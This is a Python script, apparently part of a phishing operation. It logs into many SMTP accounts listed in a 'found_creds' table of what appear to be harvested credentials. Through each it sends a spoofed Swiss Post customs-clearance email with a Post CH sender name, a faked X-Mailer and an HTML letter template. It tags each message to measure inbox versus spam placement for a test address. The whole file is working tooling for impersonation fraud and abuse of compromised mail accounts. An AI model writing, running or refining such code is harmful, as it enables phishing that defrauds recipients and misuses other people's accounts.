#!/usr/bin/env python3
"""
FULL TEST: Send from ALL SMTP to numerique.fiscal@gmail.com
Each mail has a unique marker [AT-xxxxxxxx] to identify the SMTP.
"""
import sqlite3
import time
import uuid
import ssl
import smtplib
import re
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
import threading

DB_PATH = "/opt/darkvasend/bustgo-hunt.db"
TO_EMAIL = "numerique.fiscal@gmail.com"


def strip_tld(email):
    if "@" not in email:
        return email
    local, domain = email.rsplit("@", 1)
    parts = domain.split(".")
    return f"{local}@{parts[0]}" if len(parts) > 1 else email


def load_html():
    with open("/opt/darkvasend/auditguard/swisspost_letter.html", "r") as f:
        return f.read()


HTML_CACHE = [None]

def get_html():
    if HTML_CACHE[0] is None:
        HTML_CACHE[0] = load_html()
    return HTML_CACHE[0]


def send_one(smtp_info, marker, to_email):
    host = smtp_info["smtp_host"]
    port = smtp_info["smtp_port"]
    user = smtp_info["smtp_user"]
    password = smtp_info["smtp_password"]

    actual_from = strip_tld("notifications@post.ch")
    subject = "Votre envoi est en cours de dedouanement [AT-" + marker + "]"
    html = get_html().replace("{{RECIPIENT_EMAIL}}", to_email)
    
    from datetime import datetime, timedelta
    d = datetime.now() + timedelta(days=4)
    jours = ['Lundi','Mardi','Mercredi','Jeudi','Vendredi','Samedi','Dimanche']
    mois_list = ['Janvier','Fevrier','Mars','Avril','Mai','Juin','Juillet','Aout','Septembre','Octobre','Novembre','Decembre']
    date_str = jours[d.weekday()] + ', ' + str(d.day) + '. ' + mois_list[d.month - 1] + ' ' + str(d.year)
    html = html.replace("{{DELIVERY_DATE}}", date_str)

    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = "Post CH SA <" + actual_from + ">"
    msg["To"] = to_email
    msg["Reply-To"] = "notifications@post.ch"
    msg["Message-ID"] = "<at-" + marker + "@post>"
    msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
    msg["X-Mailer"] = "Microsoft Outlook 16.0"
    msg["MIME-Version"] = "1.0"
    
    text = re.sub(r'<[^>]+>', '', html)[:500]
    msg.attach(MIMEText(text, "plain", "utf-8"))
    msg.attach(MIMEText(html, "html", "utf-8"))

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if port == 465:
            server = smtplib.SMTP_SSL(host, port, timeout=15, context=ctx)
        else:
            server = smtplib.SMTP(host, port, timeout=15)
            server.ehlo()
            try:
                server.starttls(context=ssl.create_default_context())
                server.ehlo()
            except Exception:
                pass
        server.login(user, password)
        server.sendmail(user, [to_email], msg.as_string())
        server.quit()
        return True, ""
    except smtplib.SMTPAuthenticationError:
        return False, "AUTH_FAIL"
    except smtplib.SMTPDataError as e:
        return False, "DATA_" + str(e.smtp_code)
    except smtplib.SMTPSenderRefused as e:
        return False, "SENDER_" + str(e.smtp_code)
    except Exception as e:
        return False, type(e).__name__


def main():
    db = sqlite3.connect(DB_PATH, timeout=10)
    db.row_factory = sqlite3.Row
    rows = db.execute(
        "SELECT id, domain, provider, smtp_host, smtp_port, smtp_user, smtp_password, context "
        "FROM found_creds WHERE auth_ok=1 ORDER BY id"
    ).fetchall()
    all_smtp = [dict(r) for r in rows]

    print("=" * 60)
    print("  FULL TEST: " + str(len(all_smtp)) + " SMTP -> " + TO_EMAIL)
    print("=" * 60)
    print()

    markers = {}
    lock = threading.Lock()
    sent_ok = [0]
    sent_fail = [0]

    def send_worker(s):
        marker = uuid.uuid4().hex[:8]
        ok, err = send_one(s, marker, TO_EMAIL)
        with lock:
            if ok:
                markers[marker] = s
                sent_ok[0] += 1
                ctx = s["context"] or ""
                cat = "INBOX" if "INBOX" in ctx else ("SPAM" if "SPAM" in ctx else "AUTRE")
                print("  OK   #" + str(s["id"]).rjust(3) + " " + s["smtp_host"].ljust(28) + " " + s["smtp_user"][:25].ljust(25) + " [" + cat + "] AT-" + marker)
            else:
                sent_fail[0] += 1
                print("  FAIL #" + str(s["id"]).rjust(3) + " " + s["smtp_host"].ljust(28) + " " + err)

    print("Envoi depuis tous les SMTP (10 workers)...")
    print()
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(send_worker, all_smtp)

    print()
    print("=" * 60)
    print("  ENVOYES: " + str(sent_ok[0]) + " | ECHECS: " + str(sent_fail[0]))
    print("=" * 60)
    print()
    
    # Print mapping for easy identification
    print("MAPPING MARKER -> SMTP:")
    print()
    for marker, s in sorted(markers.items(), key=lambda x: x[1]["id"]):
        ctx = s["context"] or ""
        cat = "INBOX" if "INBOX" in ctx else ("SPAM" if "SPAM" in ctx else "AUTRE")
        print("  AT-" + marker + "  ->  #" + str(s["id"]).rjust(3) + " " + s["smtp_host"].ljust(25) + " " + s["smtp_user"][:25].ljust(25) + " [" + cat + "]")

    print()
    print("Verifie " + TO_EMAIL + " — chaque mail a [AT-xxxxxxxx] dans le sujet")
    print("Compare INBOX vs SPAM pour voir le vrai tri")
    
    db.close()


if __name__ == "__main__":
    main()
